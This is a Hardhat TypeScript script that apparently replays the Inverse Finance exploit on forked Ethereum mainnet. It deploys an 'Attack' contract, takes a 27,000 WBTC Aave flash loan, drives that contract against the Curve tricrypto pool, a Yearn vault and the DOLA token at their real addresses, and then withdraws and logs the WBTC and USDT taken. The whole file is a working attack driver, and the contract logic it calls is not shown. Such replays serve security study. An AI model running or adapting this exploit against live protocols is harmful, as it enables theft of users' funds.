import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { ethers } from "hardhat";
import { ERC20Token } from "../constants/token";
import { aavePoolAddressesProvider } from "../constants/address";
import { Attack, Attack__factory, ERC20Mock } from "../typechain-types";
import {
  deployContractFromName,
  getBigNumber,
  getErc20Balance,
  getERC20ContractFromAddress,
  getNativeBalance,
} from "../utils";

async function main() {
  let Attack: Attack;
  let inverseFinanceExploiter: SignerWithAddress;
  let WBTC: ERC20Mock;
  let USDT: ERC20Mock;

  [inverseFinanceExploiter] = await ethers.getSigners();
  WBTC = await getERC20ContractFromAddress(ERC20Token.WBTC.address);
  USDT = await getERC20ContractFromAddress(ERC20Token.USDT.address);

  Attack = await deployContractFromName("Attack", Attack__factory, [
    aavePoolAddressesProvider,
  ]);
  await Attack.deployed();

  const curvePool = "0xD51a44d3FaE010294C616388b506AcdA1bfAAE46";
  const initAmount = getBigNumber(27000, ERC20Token.WBTC.decimals);
  const crv3crypto = "0xc4AD29ba4B3c580e6D59105FFf484999997675Ff";
  const yearnVault = "0xE537B5cc158EB71037D4125BDD7538421981E6AA";
  const YVCrv3CryptoFeed = "0xE8b3bC58774857732C6C1147BFc9B9e5Fb6F427C";
  const Crv = "0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490";
  const Dola = "0x865377367054516e17014CcdED1e7d814EDC9ce4";
  const depositAmount = getBigNumber(225, ERC20Token.WBTC.decimals);
  const initBalance = await getNativeBalance(inverseFinanceExploiter.address);

  await Attack.start({
    assets: [ERC20Token.WBTC.address],
    amounts: [initAmount],
    modes: [0],
    curvePool: curvePool,
    depositAmount: depositAmount,
    crv3crypto: crv3crypto,
    yearnVault: yearnVault,
    YVCrv3CryptoFeed: YVCrv3CryptoFeed,
    USDT: ERC20Token.USDT.address,
    Crv: Crv,
    Dola: Dola,
  });

  // withdraw WBTC and USDT from the attack contract
  await Attack.withdrawErc20(ERC20Token.WBTC.address);
  await Attack.withdrawErc20(ERC20Token.USDT.address);

  // check WBTC and USDT balance of the inverse finance exploiter
  const wbtcEarned = await getErc20Balance(
    WBTC,
    inverseFinanceExploiter.address,
    8
  );
  const usdtEarned = await getErc20Balance(
    USDT,
    inverseFinanceExploiter.address,
    6
  );
  console.log("Earned: ", wbtcEarned, "WBTC");
  console.log("Earned: ", usdtEarned, "USDC");
  const txFee = initBalance.sub(
    await getNativeBalance(inverseFinanceExploiter.address)
  );
  console.log(
    "Transaction Fee: ",
    parseFloat(ethers.utils.formatEther(txFee)),
    "ETH"
  );
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
